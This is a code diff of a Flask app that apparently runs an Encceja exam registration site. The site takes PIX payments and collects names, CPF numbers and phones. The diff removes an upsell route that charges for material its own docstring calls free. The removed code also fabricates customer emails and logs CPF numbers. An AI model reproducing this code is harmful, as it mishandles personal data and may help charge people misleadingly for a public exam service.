@@ -1154,32 +1154,10 @@ def create_pix_payment():
             # Construir resposta com suporte a ambos formatos (NovaEra e For4Payments)
             response = {
                 'transaction_id': payment_result.get('id'),
-                'pix_code': payment_result.get('pix_code') or payment_result.get('copy_paste'),
-                'pix_qr_code': payment_result.get('pix_qr_code') or payment_result.get('qr_code_image'),
+                'pix_code': payment_result.get('pix_code'),
+                'pix_qr_code': payment_result.get('pix_qr_code'),
                 'status': payment_result.get('status', 'pending')
             }
-            
-            # Log detalhado para depuração
-            app.logger.info(f"[PROD] Resposta formatada: {response}")
-            
-            # Para For4Payments, pode ser necessário extrair campos específicos
-            if os.environ.get('GATEWAY_CHOICE') == 'FOR4':
-                app.logger.info(f"[PROD] Usando gateway For4, verificando campos específicos...")
-                
-                # Verificar campos raw na resposta original
-                if 'pixCode' in payment_result:
-                    response['pix_code'] = payment_result.get('pixCode')
-                    app.logger.info(f"[PROD] Usando campo pixCode: {response['pix_code'][:30]}...")
-                elif 'copy_paste' in payment_result:
-                    response['pix_code'] = payment_result.get('copy_paste')
-                    app.logger.info(f"[PROD] Usando campo copy_paste: {response['pix_code'][:30]}...")
-                    
-                if 'pixQrCode' in payment_result:
-                    response['pix_qr_code'] = payment_result.get('pixQrCode')
-                    app.logger.info(f"[PROD] Usando campo pixQrCode")
-                elif 'qr_code_image' in payment_result:
-                    response['pix_qr_code'] = payment_result.get('qr_code_image')
-                    app.logger.info(f"[PROD] Usando campo qr_code_image")
             
             return jsonify(response)
             
@@ -1274,38 +1252,6 @@ def check_for4payments_status():
             nome = request.args.get('nome', '')
             cpf = request.args.get('cpf', '')
             phone = request.args.get('phone', '')
-            amount = request.args.get('amount', '0')
-            
-            # Verificar se o pagamento é de R$ 143,10 para redirecionar para a página do livro
-            try:
-                # Tentar converter para float para comparação
-                amount_float = float(amount.replace(',', '.')) if isinstance(amount, str) else float(amount)
-                
-                if amount_float == 143.10:
-                    app.logger.info(f"[PROD] Pagamento de R$ 143,10 aprovado. Redirecionando para página de livro.")
-                    
-                    # Construir o URL para a página do livro
-                    livro_url = request.url_root.rstrip('/') + '/livro'
-                    
-                    # Adicionar parâmetros do usuário
-                    params = {
-                        'nome': nome if nome else '',
-                        'cpf': cpf if cpf else '',
-                        'phone': phone if phone else ''
-                    }
-                    
-                    # Construir a URL completa com parâmetros
-                    if params:
-                        import urllib.parse
-                        query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
-                        livro_url += '?' + query_string
-                    
-                    # Indicar para o frontend redirecionar para a página do livro
-                    status_result['redirect_url'] = livro_url
-                    
-                    return jsonify(status_result)
-            except (ValueError, TypeError) as e:
-                app.logger.error(f"[PROD] Erro ao converter valor do pagamento: {str(e)}")
             
             app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
             
@@ -1521,67 +1467,6 @@ def inscricao_sucesso():
 def encceja_info():
     """Página com informações detalhadas sobre o Encceja"""
     return render_template('encceja_info.html')
-    
-@app.route('/livro')
-def livro_material():
-    """Página de material didático gratuito do Encceja"""
-    try:
-        # Get customer data from query parameters if available
-        customer = {
-            'name': request.args.get('nome', ''),
-            'cpf': request.args.get('cpf', ''),
-            'phone': request.args.get('phone', '')
-        }
-        
-        app.logger.info(f"[PROD] Renderizando página de material didático com dados: {customer}")
-        return render_template('livro.html', customer=customer)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro na página de material didático: {str(e)}")
-        return redirect(url_for('index'))
-        
-@app.route('/create-book-payment', methods=['POST'])
-def create_book_payment():
-    """Criar um pagamento para o material didático do ENCCEJA"""
-    if request.method == 'POST':
-        try:
-            # Obter dados do JSON enviado no corpo da requisição
-            data = request.get_json()
-            
-            # Validar os dados necessários
-            if not data or not data.get('nome') or not data.get('cpf'):
-                app.logger.error(f"[PROD] Dados incompletos para pagamento de livro: {data}")
-                return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
-                
-            nome = data.get('nome')
-            cpf = data.get('cpf')
-            telefone = data.get('telefone', '')
-            
-            app.logger.info(f"[PROD] Criando pagamento para material didático para: {nome} ({cpf})")
-            
-            # Usar API de pagamento For4Payments
-            from for4payments import create_payment_api
-            try:
-                payment_api = create_payment_api()
-                payment_result = payment_api.create_book_payment({
-                    'name': nome,
-                    'cpf': cpf,
-                    'phone': telefone,
-                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
-                })
-                
-                app.logger.info(f"[PROD] Pagamento para material didático criado: {payment_result}")
-                return jsonify(payment_result)
-                
-            except Exception as payment_error:
-                app.logger.error(f"[PROD] Erro no gateway de pagamento: {str(payment_error)}")
-                return jsonify({'error': f'Erro no gateway de pagamento: {str(payment_error)}'}), 500
-                
-        except Exception as e:
-            app.logger.error(f"[PROD] Erro ao criar pagamento para material didático: {str(e)}")
-            return jsonify({'error': f'Erro interno: {str(e)}'}), 500
-            
-    # Em caso de método não POST
-    return jsonify({'error': 'Método não permitido'}), 405
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento_encceja():
